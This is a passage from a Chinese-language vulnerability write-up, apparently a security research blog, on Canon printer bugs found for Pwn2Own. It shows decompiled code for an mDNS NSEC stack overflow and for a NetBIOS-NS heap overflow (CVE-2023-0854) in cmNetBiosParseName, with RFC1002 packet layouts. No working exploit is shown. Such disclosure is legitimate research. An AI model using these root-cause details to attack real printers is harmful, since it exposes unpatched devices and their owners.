      &lt;span class=&quot;n&quot;&gt;v57&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v56&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v55&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;nsec_len_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__rev16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v57&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nsec_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nsec_len_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v57&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-------- [1]  stack overflow &lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec_len_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nsec_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
              &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v62&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;v63&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
              &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;v62&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_WORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v62&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;

  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pinfo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cur_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_mdns_packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;anwser_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v66&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;當他在處理 NSEC(47) 的 Record 時，並沒有檢查長度就直接複製 data 到 local buffer(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nsec_buf[256]&lt;/code&gt;) ，如上述程式碼的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[1]&lt;/code&gt;，導致 stack overflow&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;這裡利用方法與 Pwn2Own 2021 Austin 時&lt;a href=&quot;/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1/&quot;&gt;相同&lt;/a&gt;，這邊就不在多做敘述。&lt;/p&gt;

&lt;h4 id=&quot;netbios-cve-2023-0854&quot;&gt;NetBIOS (CVE-2023-0854)&lt;/h4&gt;

&lt;p&gt;在 NetBIOS 中主要提供下列三種不同的服務:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Name service (NetBIOS-NS) : Port 137/TCP and 137/UDP&lt;/li&gt;
  &lt;li&gt;Datagram distribution service (NetBIOS-DGM) : Port 138/UDP&lt;/li&gt;
  &lt;li&gt;Session service (NetBIOS-SSN) : Port 139/TCP&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;這邊我們將會把重點放在 NetBIOS-NS 中，NetBIOS-NS 也會提供區網中域名解析的服務，常見於 Windows 作業系統中，而該封包格式也是基於 DNS 的封包。其詳細內容定義於 &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc1002&quot;&gt;RFC1002&lt;/a&gt; 中&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;The packet format:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;     1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |         NAME_TRN_ID           | OPCODE  |   NM_FLAGS  | RCODE |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |          QDCOUNT              |           ANCOUNT             |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |          NSCOUNT              |           ARCOUNT             |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
(diagram from https://datatracker.ietf.org/doc/html/rfc1002)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;而 Query 則會被放在 header 之後&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                        1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                                                               |
   + ------                                                ------- +
   |                            HEADER                             |
   + ------                                                ------- +
   |                                                               |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                                                               |
   /                       QUESTION ENTRIES                        /
   |                                                               |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                                                               |
   /                    ANSWER RESOURCE RECORDS                    /
   |                                                               |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                                                               |
   /                  AUTHORITY RESOURCE RECORDS                   /
   |                                                               |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                                                               |
   /                  ADDITIONAL RESOURCE RECORDS                  /
   |                                                               |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
(diagram from https://datatracker.ietf.org/doc/html/rfc1002)

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;其中我們只須關注於 Question Entries 欄位&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Question Section:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                        1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                                                               |
   /                         QUESTION_NAME                         /
   /                                                               /
   |                                                               |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |         QUESTION_TYPE         |        QUESTION_CLASS         |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Question Name 都是由許多 label 組成，每個 label 都如同前述 LLMNR 所述，都是長度加上字串的組合。其餘欄位則不另外多加敘述，詳細內容可參考 &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc1002&quot;&gt;RFC1002&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;漏洞位置&lt;/strong&gt;
當 Canon ImageCLASS MF743Cdw 在處理 NetBIOS 封包的 Question 欄位時，沒有正確檢查長度導致 Heap Overflow 。&lt;/p&gt;

&lt;p&gt;其漏洞位置在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmNetBiosParseName&lt;/code&gt; 中，我們可透過 ndNameProcessExternalMessage 觸發。&lt;/p&gt;

&lt;p&gt;我們這邊就稍微來分析一下漏洞成因:&lt;/p&gt;

&lt;p&gt;當 Canon 中的 NetBIOS 服務啟動時，會先去初始化 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netbios_ns_buffer&lt;/code&gt; ，並分配 0xff 大小空間給該 buffer。&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ndNameInit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;sub_41C47A20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqendapp/IMP/nq/ndnampro.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED3194&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;97&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x64u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;netbios_ns_buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;calloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;當接收到來自 137/UDP 的 NetBIOS 封包時，就會透過 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ndNameProcessExternalMessage &lt;/code&gt; 來處理封包&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ndNameProcessExternalMessage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Adapter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r6&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r4&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+8h] [bp-28h] BYREF&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;sub_41C47A20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqendapp/IMP/nq/ndnampro.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED31AC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;178&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x64u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;LOWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vvv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LOBYTE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HIBYTE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmNetBiosParseName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;netbios_ns_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFFu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;//---- [1]&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;//heap overflow at netbios_ns_buffer  &lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getname_query_flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xA800&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ndInternalNamePositiveRegistration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
